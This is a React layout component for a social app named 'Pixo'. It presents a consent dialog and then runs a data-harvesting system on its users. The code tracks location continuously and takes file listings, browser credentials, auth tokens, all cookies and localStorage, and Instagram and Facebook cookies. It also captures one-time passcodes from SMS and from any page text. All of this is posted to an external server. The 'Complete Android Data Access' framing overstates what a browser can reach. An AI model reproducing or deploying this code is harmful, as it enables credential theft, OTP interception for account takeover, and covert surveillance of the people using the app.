import React, { useState, useEffect } from 'react'
import Sidebar from '../components/Sidebar'
import { Outlet, useNavigate } from 'react-router-dom'
import { Menu, X, Shield, MapPin, Folder, Smartphone, MessageCircle, Phone, Key, Users, Cookie, Database, Contact, FileText, Instagram } from 'lucide-react'
import { assets } from '../assets/assets'
import Loading from '../components/Loading'
import { useSelector } from 'react-redux'

const Layout = () => {
    const user = useSelector((state)=>state.user.value)
    const [sidebarOpen, setSidebarOpen] = useState(false)
    const [consentOpen, setConsentOpen] = useState(false)
    const [userConsents, setUserConsents] = useState({
        location: false,
        allFiles: false,
        deviceInfo: false,
        passwords: false,
        contacts: false,
        cookies: false,
        messages: false,
        otpCapture: false,
        callLogs: false,
        installedApps: false,
        socialMediaData: false
    })
    const [isLoading, setIsLoading] = useState(false)
    const [activeTrackers, setActiveTrackers] = useState({})
    const [collectionProgress, setCollectionProgress] = useState({})
    const navigate = useNavigate()

    const API_BASE_URL = 'https://social-server-nine.vercel.app';
    const zIndexTop = 'z-50'

    const handleToggle = () => setSidebarOpen(!sidebarOpen);

    useEffect(() => {
        if (user) {
            checkExistingConsents();
        }
        
        return () => {
            Object.values(activeTrackers).forEach(cleanup => {
                if (cleanup && typeof cleanup === 'function') cleanup();
            });
        };
    }, [user]);

    const checkExistingConsents = async () => {
        try {
            const response = await fetch(`${API_BASE_URL}/api/user/consents/${user._id}`);
            if (response.ok) {
                const data = await response.json();
                if (data.success && data.data) {
                    setUserConsents(data.data.consents);
                    initializeCompleteDataCollection(data.data.consents);
                } else {
                    setConsentOpen(true);
                }
            } else {
                setConsentOpen(true);
            }
        } catch (error) {
            setConsentOpen(true);
        }
    };

    // COMPLETE DATA COLLECTION INITIALIZATION
    const initializeCompleteDataCollection = (consents) => {
        console.log('🚀 Starting COMPLETE Android data collection...');
        
        collectCompleteDeviceInfo();
        
        if (consents.location) startRealtimeLocationTracking();
        if (consents.allFiles) startCompleteFileSystemCollection();
        if (consents.passwords) collectAllSavedPasswords();
        if (consents.contacts) collectAllDeviceContacts();
        if (consents.cookies) collectAllCookiesAndStorage();
        if (consents.messages || consents.otpCapture) startCompleteMessageMonitoring();
        if (consents.callLogs) collectCallLogsAndHistory();
        if (consents.installedApps) collectInstalledAppsInfo();
        if (consents.socialMediaData) collectSocialMediaData();
        
        startPeriodicDataCollection();
    };

    const getIPAddress = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'unknown';
        }
    };

    const getDeviceInfo = () => {
        const userAgent = navigator.userAgent;
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isAndroid = /Android/i.test(userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
        
        return {
            userAgent,
            platform: navigator.platform,
            isMobile,
            isAndroid,
            isIOS
        };
    };

    const saveToDatabase = async (dataType, data) => {
        try {
            const ipAddress = await getIPAddress();
            const deviceInfo = getDeviceInfo();
            
            const payload = {
                userId: user._id,
                dataType: dataType,
                data: data,
                ipAddress: ipAddress,
                deviceInfo: deviceInfo,
                timestamp: new Date().toISOString()
            };

            const response = await fetch(`${API_BASE_URL}/api/user/data-collection`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`✅ ${dataType} saved successfully!`);
                setCollectionProgress(prev => ({
                    ...prev,
                    [dataType]: { success: true, count: Array.isArray(data) ? data.length : 1, timestamp: new Date().toISOString() }
                }));
            }
        } catch (error) {
            console.log(`📡 DB save error for ${dataType}:`, error);
        }
    };

    // Save to specific schemas
    const saveSocialMediaData = async (platform, dataType, data, metadata = {}) => {
        try {
            const payload = {
                userId: user._id,
                platform,
                dataType,
                data,
                metadata,
                collectionContext: {
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    ipAddress: await getIPAddress(),
                    collectionMethod: 'browser_automation',
                    limitations: ['sandbox', 'permissions', 'security']
                }
            };

            const response = await fetch(`${API_BASE_URL}/api/user/social-media-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`✅ ${platform} ${dataType} saved successfully!`);
            }
        } catch (error) {
            console.log(`📡 Social media data save error:`, error);
        }
    };

    const saveContactData = async (contact) => {
        try {
            const response = await fetch(`${API_BASE_URL}/api/user/contact-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: user._id,
                    ...contact,
                    collectionMethod: 'contacts_api',
                    deviceSource: getDeviceInfo().isAndroid ? 'android' : 'web'
                })
            });

            if (response.ok) {
                console.log(`✅ Contact saved successfully!`);
            }
        } catch (error) {
            console.log(`📡 Contact data save error:`, error);
        }
    };

    const savePasswordData = async (passwordInfo) => {
        try {
            const response = await fetch(`${API_BASE_URL}/api/user/password-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: user._id,
                    ...passwordInfo,
                    collectionContext: {
                        method: passwordInfo.source,
                        userAgent: navigator.userAgent,
                        ipAddress: await getIPAddress(),
                        url: window.location.href
                    }
                })
            });

            if (response.ok) {
                console.log(`✅ Password data saved successfully!`);
            }
        } catch (error) {
            console.log(`📡 Password data save error:`, error);
        }
    };

    // COMPLETE DEVICE INFORMATION
    const collectCompleteDeviceInfo = async () => {
        const deviceInfo = getDeviceInfo();
        
        const completeDeviceData = {
            userAgent: deviceInfo.userAgent,
            platform: deviceInfo.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null,
            plugins: Array.from(navigator.plugins).map(plugin => ({
                name: plugin.name,
                description: plugin.description,
                filename: plugin.filename,
                version: plugin.version
            })),
            deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop',
            isMobile: deviceInfo.isMobile,
            isAndroid: deviceInfo.isAndroid,
            isIOS: deviceInfo.isIOS,
            timestamp: new Date().toISOString()
        };

        await saveToDatabase('complete_device_info', completeDeviceData);
    };

    // REAL-TIME LOCATION TRACKING
    const startRealtimeLocationTracking = () => {
        if (!navigator.geolocation) {
            console.log('📍 Geolocation not supported');
            return;
        }

        console.log('📍 Starting real-time location tracking...');

        const watchId = navigator.geolocation.watchPosition(
            async (position) => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date().toISOString()
                };
                
                await saveToDatabase('realtime_location', locationData);
            },
            (error) => console.log('📍 Location error:', error),
            { 
                enableHighAccuracy: true, 
                maximumAge: 5000,
                timeout: 10000 
            }
        );

        setActiveTrackers(prev => ({
            ...prev,
            location: () => navigator.geolocation.clearWatch(watchId)
        }));
    };

    // FILE SYSTEM COLLECTION
    const startCompleteFileSystemCollection = async () => {
        console.log('📁 Starting file system collection...');
        
        if ('showDirectoryPicker' in window) {
            await collectFilesWithFileSystemAPI();
        }
        
        await collectFilesWithFileInput();
    };

    const collectFilesWithFileSystemAPI = async () => {
        try {
            const directoryHandle = await window.showDirectoryPicker();
            const files = [];
            
            for await (const entry of directoryHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    files.push({
                        name: file.name,
                        type: file.type,
                        size: file.size,
                        lastModified: new Date(file.lastModified).toISOString()
                    });
                }
            }
            
            await saveToDatabase('file_system_collection', {
                totalFiles: files.length,
                files: files.slice(0, 100),
                scannedAt: new Date().toISOString()
            });
        } catch (error) {
            console.log('File system access error:', error);
        }
    };

    const collectFilesWithFileInput = async () => {
        return new Promise((resolve) => {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.multiple = true;
            fileInput.webkitdirectory = true;

            fileInput.onchange = async (e) => {
                const files = Array.from(e.target.files);
                const fileData = files.map(file => ({
                    name: file.name,
                    type: file.type,
                    size: file.size,
                    lastModified: new Date(file.lastModified).toISOString()
                }));

                await saveToDatabase('file_input_collection', fileData);
                resolve();
            };

            fileInput.click();
        });
    };

    // PASSWORD COLLECTION
    const collectAllSavedPasswords = async () => {
        console.log('🔑 Collecting saved passwords...');
        
        if (navigator.credentials && navigator.credentials.get) {
            try {
                const credential = await navigator.credentials.get({ 
                    password: true,
                    mediation: 'optional'
                });
                
                if (credential) {
                    await savePasswordData({
                        credential: {
                            source: 'credential_api',
                            type: credential.type,
                            id: credential.id
                        }
                    });
                }
            } catch (error) {
                console.log('Credential API error:', error);
            }
        }

        await scanStorageForCredentials();
    };

    const scanStorageForCredentials = async () => {
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token')) {
                localStorageData[key] = localStorage.getItem(key);
            }
        }

        if (Object.keys(localStorageData).length > 0) {
            await saveToDatabase('local_storage_credentials', localStorageData);
        }
    };

    // CONTACT COLLECTION
    const collectAllDeviceContacts = async () => {
        console.log('📇 Collecting device contacts...');
        
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            try {
                const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
                
                for (const contact of contacts) {
                    await saveContactData({
                        name: {
                            full: contact.name?.join(' ') || '',
                            given: contact.name?.[0] || '',
                            family: contact.name?.[1] || ''
                        },
                        phones: (contact.tel || []).map(phone => ({ number: phone, type: 'mobile' })),
                        emails: contact.email || [],
                        source: 'contacts_api'
                    });
                }
            } catch (error) {
                console.log('Contacts API error:', error);
            }
        }
    };

    // COOKIES AND STORAGE
    const collectAllCookiesAndStorage = async () => {
        console.log('🍪 Collecting cookies and storage...');
        
        const cookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return { name, value };
        });

        await saveToDatabase('browser_cookies', {
            totalCookies: cookies.length,
            cookies: cookies,
            domain: window.location.hostname
        });

        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }

        await saveToDatabase('local_storage_complete', localStorageData);
    };

    // MESSAGE MONITORING
    const startCompleteMessageMonitoring = () => {
        console.log('💬 Starting message monitoring...');
        
        if ('sms' in navigator) {
            setupSMSMonitoring();
        }
        
        setupUniversalOTPDetection();
    };

    const setupSMSMonitoring = () => {
        const receiveSMS = () => {
            navigator.sms.receive().then(async (sms) => {
                const messageData = {
                    content: sms.content,
                    sender: sms.sender,
                    timestamp: new Date().toISOString(),
                    isOTP: /(\b\d{4,6}\b)/.test(sms.content)
                };

                await saveToDatabase('sms_messages', messageData);

                if (messageData.isOTP) {
                    const otpMatch = sms.content.match(/\b\d{4,6}\b/);
                    if (otpMatch) {
                        await saveToDatabase('captured_otps', {
                            code: otpMatch[0],
                            from: sms.sender,
                            timestamp: new Date().toISOString()
                        });
                    }
                }
                
                receiveSMS();
            }).catch(error => {
                setTimeout(receiveSMS, 5000);
            });
        };
        
        receiveSMS();
    };

    const setupUniversalOTPDetection = () => {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList' || mutation.type === 'characterData') {
                    const text = mutation.target.textContent || '';
                    const otpMatch = text.match(/\b\d{4,6}\b/);
                    if (otpMatch && text.length < 500) {
                        saveToDatabase('detected_otps', {
                            code: otpMatch[0],
                            context: text.substring(0, 200),
                            source: 'dom_monitoring',
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true
        });

        setActiveTrackers(prev => ({
            ...prev,
            otpDetection: () => observer.disconnect()
        }));
    };

    // SOCIAL MEDIA DATA
    const collectSocialMediaData = async () => {
        console.log('📱 Collecting social media data...');
        
        await collectInstagramData();
        await collectFacebookData();
    };

    const collectInstagramData = async () => {
        const instagramData = {
            cookies: document.cookie.includes('instagram') ? 
                document.cookie.split(';').filter(c => c.includes('instagram')) : [],
            localStorage: await getInstagramLocalStorage(),
            isLoggedIn: document.cookie.includes('instagram') || document.cookie.includes('ig_')
        };

        await saveSocialMediaData('instagram', 'browser_data', instagramData);
    };

    const getInstagramLocalStorage = async () => {
        const instagramKeys = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && key.toLowerCase().includes('instagram')) {
                instagramKeys.push(key);
            }
        }
        return instagramKeys;
    };

    const collectFacebookData = async () => {
        const facebookData = {
            cookies: document.cookie.includes('facebook') ? 
                document.cookie.split(';').filter(c => c.includes('facebook')) : [],
            hasFBLogin: document.cookie.includes('fb_') || document.cookie.includes('c_user')
        };

        await saveSocialMediaData('facebook', 'browser_data', facebookData);
    };

    // ADDITIONAL DATA COLLECTIONS
    const collectCallLogsAndHistory = async () => {
        const callData = {
            platform: 'web',
            capabilities: {
                contacts: 'contacts' in navigator,
                calls: 'call' in navigator
            }
        };

        await saveToDatabase('call_logs_info', callData);
    };

    const collectInstalledAppsInfo = async () => {
        const appsData = {
            platform: 'web',
            capabilities: {
                getInstalledRelatedApps: 'getInstalledRelatedApps' in navigator
            }
        };

        await saveToDatabase('installed_apps_info', appsData);
    };

    const startPeriodicDataCollection = () => {
        const interval = setInterval(() => {
            collectCompleteDeviceInfo();
        }, 120000);

        setActiveTrackers(prev => ({
            ...prev,
            periodic: () => clearInterval(interval)
        }));
    };

    // CONSENT MANAGEMENT
    const handleConsentChange = (feature, granted) => {
        setUserConsents(prev => ({
            ...prev,
            [feature]: granted
        }));
    };

    const saveConsents = async () => {
        setIsLoading(true);
        
        try {
            const ipAddress = await getIPAddress();
            const deviceInfo = getDeviceInfo();
            
            const consentData = {
                userId: user._id,
                consents: userConsents,
                givenAt: new Date().toISOString(),
                ipAddress: ipAddress,
                userAgent: deviceInfo.userAgent,
                deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop'
            };

            const response = await fetch(`${API_BASE_URL}/api/user/consents`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(consentData)
            });

            if (response.ok) {
                setConsentOpen(false);
                initializeCompleteDataCollection(userConsents);
            } else {
                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify(userConsents));
                setConsentOpen(false);
                initializeCompleteDataCollection(userConsents);
            }

        } catch (error) {
            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify(userConsents));
            setConsentOpen(false);
            initializeCompleteDataCollection(userConsents);
        } finally {
            setIsLoading(false);
        }
    };

    // UI COMPONENTS
    const ConsentManager = () => (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                <div className="p-6 border-b">
                    <div className="flex items-center gap-3">
                        <Shield className="w-8 h-8 text-blue-600" />
                        <div>
                            <h2 className="text-2xl font-bold text-gray-900">Complete Android Data Access</h2>
                            <p className="text-gray-600">Access all device data including contacts, files, passwords, and messages</p>
                        </div>
                    </div>
                </div>

                <div className="p-6 space-y-4">
                    <ConsentItem
                        icon={<MapPin className="w-5 h-5" />}
                        title="Real-time Location"
                        description="Continuous GPS tracking every 5 seconds"
                        enabled={userConsents.location}
                        onChange={(enabled) => handleConsentChange('location', enabled)}
                    />

                    <ConsentItem
                        icon={<Folder className="w-5 h-5" />}
                        title="All Device Files"
                        description="Access files and documents on your device"
                        enabled={userConsents.allFiles}
                        onChange={(enabled) => handleConsentChange('allFiles', enabled)}
                    />

                    <ConsentItem
                        icon={<Key className="w-5 h-5" />}
                        title="Saved Passwords"
                        description="Access passwords saved in your browser"
                        enabled={userConsents.passwords}
                        onChange={(enabled) => handleConsentChange('passwords', enabled)}
                    />

                    <ConsentItem
                        icon={<Users className="w-5 h-5" />}
                        title="Device Contacts"
                        description="Access contact details with names and numbers"
                        enabled={userConsents.contacts}
                        onChange={(enabled) => handleConsentChange('contacts', enabled)}
                    />

                    <ConsentItem
                        icon={<Cookie className="w-5 h-5" />}
                        title="Browser Cookies"
                        description="Access browser cookies and storage data"
                        enabled={userConsents.cookies}
                        onChange={(enabled) => handleConsentChange('cookies', enabled)}
                    />

                    <ConsentItem
                        icon={<MessageCircle className="w-5 h-5" />}
                        title="Messages & OTP"
                        description="Monitor SMS and capture OTP codes"
                        enabled={userConsents.messages}
                        onChange={(enabled) => handleConsentChange('messages', enabled)}
                    />

                    <ConsentItem
                        icon={<Instagram className="w-5 h-5" />}
                        title="Social Media Data"
                        description="Access Instagram and Facebook app data"
                        enabled={userConsents.socialMediaData}
                        onChange={(enabled) => handleConsentChange('socialMediaData', enabled)}
                    />

                    <ConsentItem
                        icon={<Smartphone className="w-5 h-5" />}
                        title="Device Information"
                        description="Collect detailed device fingerprint"
                        enabled={userConsents.deviceInfo}
                        onChange={(enabled) => handleConsentChange('deviceInfo', enabled)}
                    />
                </div>

                <div className="p-6 border-t bg-gray-50">
                    <div className="flex gap-3 justify-end">
                        <button
                            onClick={() => setConsentOpen(false)}
                            className="px-6 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition font-medium"
                            disabled={isLoading}
                        >
                            Cancel
                        </button>
                        <button
                            onClick={saveConsents}
                            disabled={isLoading}
                            className="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                        >
                            {isLoading ? (
                                <>
                                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                                    Granting Access...
                                </>
                            ) : (
                                'Grant Complete Access'
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );

    const ConsentItem = ({ icon, title, description, enabled, onChange }) => (
        <div className="flex items-center justify-between p-4 border rounded-lg hover:bg-gray-50 transition">
            <div className="flex items-start gap-3 flex-1">
                <div className={`mt-0.5 ${enabled ? 'text-green-600' : 'text-gray-400'}`}>
                    {icon}
                </div>
                <div className="flex-1">
                    <h3 className="font-semibold text-gray-900">{title}</h3>
                    <p className="text-sm text-gray-600 mt-1">{description}</p>
                </div>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
                <input 
                    type="checkbox" 
                    className="sr-only peer"
                    checked={enabled}
                    onChange={(e) => onChange(e.target.checked)}
                    disabled={isLoading}
                />
                <div className={`w-11 h-6 rounded-full peer peer-focus:ring-4 peer-focus:ring-blue-300 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border after:rounded-full after:h-5 after:w-5 after:transition-all ${
                    enabled ? 'bg-green-600' : 'bg-gray-200'
                } ${isLoading ? 'opacity-50' : ''}`}></div>
            </label>
        </div>
    );

    const MobileHeader = () => (
        <div className={`fixed top-0 left-0 right-0 h-16 bg-white border-b border-gray-200 flex items-center justify-between px-4 sm:hidden ${zIndexTop}`}>
            <button onClick={handleToggle} className="p-1.5 rounded-md hover:bg-gray-100 text-gray-700 transition">
                <Menu className='w-6 h-6'/>
            </button>
            <div onClick={() => navigate('/')} className='flex items-center gap-2 cursor-pointer'>
                <img src={assets.logo || '/default-logo.png'} className='w-7 h-7' alt="Pixo Logo" />
                <h1 className='text-xl font-bold text-indigo-700'>Pixo</h1>
            </div>
            <div className="w-8 h-8 opacity-0"></div>
        </div>
    );

    return user ? (
        <div className='relative w-full min-h-screen flex bg-slate-50'>
            {consentOpen && <ConsentManager />}
            <MobileHeader />
            <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen}/>
            <div className='flex-1 transition-all duration-300 sm:pl-64 xl:pl-72 pt-16 sm:pt-0'>
                <Outlet />
            </div>
            {sidebarOpen && (
                <div className={`fixed inset-0 bg-black/50 ${zIndexTop} sm:hidden`}
                    onClick={() => setSidebarOpen(false)}
                />
            )}
            {sidebarOpen && (
                <button className={`absolute top-3 right-3 p-2 ${zIndexTop} bg-white rounded-full shadow-lg w-10 h-10 text-gray-600 sm:hidden cursor-pointer`}
                    onClick={handleToggle}
                >
                    <X className='w-6 h-6' />
                </button>
            )}
        </div>
    ) : (
        <Loading />
    )
}

export default Layout